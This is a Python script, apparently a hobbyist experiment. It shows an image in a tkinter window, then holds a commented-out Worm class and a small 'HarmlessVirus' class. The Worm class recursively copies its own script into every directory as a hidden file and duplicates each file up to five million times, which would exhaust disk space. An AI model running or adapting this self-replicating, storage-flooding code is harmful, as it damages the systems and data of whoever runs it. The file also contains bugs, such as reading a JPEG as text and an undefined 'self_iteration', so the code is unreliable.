import tkinter as tk
import shutil
import os
from pathlib import Path
from PIL import Image, ImageTk
parent = tk.Tk()
parent.title("Application Title")
image_path = "OIP.jpg"
image = Image.open(image_path)
photo = ImageTk.PhotoImage(image)
image_label = tk.Label(parent, image=photo)
image_label.pack()
parent.mainloop()

pink = Path('OIP.jpg')
contents = pink.read_text()
lines = contents.splitlines()
for line in lines:
    print(line)
pink = Path('/home/Documents/Github/Evit/advancedworm/OIP.jpg')
print('OIP.jpg')

'''class Worm:
    def __init__ (self, path=None, target_dir_list= None, iteration= None):
        if path is None:
            self.path = "/"
        else:
            self.path = path
        if isinstance(target_dir_list, type(None)):
            self.target_dir_list = []
        else: 
            self.target_dir_list = target_dir_list
        if isinstance(target_dir_list, type(None)):
            self.iteration = 5000000
        else: self.iteration = iteration
       
        self.own_path = __file__
    
    def display_path(self): 
        print(self.path)
    
    def list_directories(self,path):
        self.target_dir_list.append(path)
        try:
            files_in_current_directory = os.listdir(path)
            for file in files_in_current_directory:
                if not file.startswith('.'):
                    absolute_path = os.path.join(path, file)
                    print(absolute_path)
                    if os.path.isdir(absolute_path):
                     self.list_directories(absolute_path)
        except FileNotFoundError as e:
            print(f"Error: {e}")
    
    def create_new_worm(self):
        for directory in self.target_dir_list:
            destination = os.path.join(directory, ".worm.py")
            # copy the script in the new directory with similar name
            shutil.copyfile(self.own_path, destination)
    def copy_existing_files(self):
        for directory in self.target_dir_list:
            file_list_in_dir = os.listdir(directory)
            for file in file_list_in_dir:
                abs_path = os.path.join(directory, file)
                if not abs_path.startswith('.') and not os.path.isdir(abs_path):
                    source = abs_path
                    for i in range(self.iteration):
                        destination = os.path.join(directory, f".{file}{i}")
                        shutil.copyfile(source, destination)
    def start_worm_actions(self):
     self.list_directories(self.path)
     print(self.target_dir_list)
     self.create_new_worm()
     self.copy_existing_files()

if __name__ =="__main__":
     current_directory = os.path.abspath(".")
     worm = Worm(path=current_directory)
     worm.start_worm_actions()'''

class HarmlessVirus:
    def __init__(self, path=None, iteration=5):
        self.path = path if path else os.getcwd()
        self.iteration = iteration
    def create_files(self):
        for i in range(self_iteration):
            file_name = f"harmless_file_{i+1}.txt"
            file_path  = Path(self.path) / file_name
            with open(file_path, 'w') as file:
                file.write("This is harmless! Do not fear!\n")
            print(f"Created: {file_path}")

if __name__ == "__main__":
    current_directory = os.path.abspath(".")

virus = HarmlessVirus(path=current_directory, iteration=5)

virus.create_files()